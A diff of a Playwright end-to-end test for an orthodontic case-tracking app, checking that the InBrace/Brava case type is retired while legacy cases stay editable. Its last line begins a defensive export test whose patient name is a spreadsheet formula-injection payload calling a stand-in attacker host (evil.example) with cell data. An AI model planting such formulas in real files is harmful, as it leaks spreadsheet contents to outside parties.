@@ -462,10 +462,23 @@ async function openByName(p, name) {
   await owner.click('#drawer [data-act=edit]'); await owner.waitForSelector('#drawer .cf');
   check((await owner.getAttribute('#drawer .pickRow[data-g=initialDE] .pick[data-v=de2]', 'aria-pressed')) === 'true', 'editing keeps DE 2');
   await owner.click('#drawer [data-act=cancelEdit]'); await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
+
+  console.log('\n# InBrace/Brava retired; InSmile stays');
   await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
-  await owner.click('#ncForm .tt[data-tile=inbrace]');
-  check(!(await owner.isVisible('.pickRow[data-g=initial]')) && !(await owner.isVisible('.pickRow[data-g=initialDE]')), 'InBrace: no refinement question either');
+  check((await owner.locator('#ncForm .tt[data-tile=inbrace]').count()) === 0 && await owner.isVisible('#ncForm .tt[data-tile=insmile]'), 'New case has no InBrace/Brava button; InSmile is still there');
   await owner.click('.modal [data-act=closeModal]');
+  await owner.click('#nav-list'); await owner.fill('#q', '');
+  check((await owner.locator('select[data-f=type] option[value=inbrace]').count()) === 0, 'the type filter doesn’t offer InBrace when no case uses it');
+  // an older InBrace case (say, imported from Asana) still opens and edits
+  await owner.evaluate(() => B.createCase({ type: 'inbrace', patient: 'Leona Legacycase', stage: 'dra', detail: 'InBrace IDB', comments: [], createdAt: Date.now(), createdBy: meSid() }));
+  await openByName(owner, 'Leona Legacycase');
+  await owner.click('#drawer [data-act=edit]'); await owner.waitForSelector('#drawer .cf');
+  check((await owner.getAttribute('#drawer .tt[data-tile=inbrace]', 'aria-checked')) === 'true' && (await owner.locator('#drawer .tt[data-tile]').count()) === (await owner.evaluate(() => TILES.length)), 'an older InBrace case still edits as InBrace');
+  await owner.fill('#drawer #cf-notes', 'legacy-edit-ok');
+  await owner.click('[data-act=saveEdit]'); await owner.waitForSelector('#drawer .stepper', { timeout: 20000 });
+  check(await owner.isVisible('#drawer .dHd .badge:has-text("InBrace")') && await owner.isVisible('#drawer .txt:has-text("legacy-edit-ok")'), 'saving keeps it InBrace with the change');
+  await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
+  check((await owner.locator('select[data-f=type] option[value=inbrace]').count()) === 1, 'the filter offers InBrace while such a case is open');
 
   console.log('\n# Spreadsheet-formula text is neutralized in the export');
   await owner.fill('#q', ''); await newCase(owner, { type: 'misc', patient: '=HYPERLINK("http://evil.example/?"&A1,"x")' });
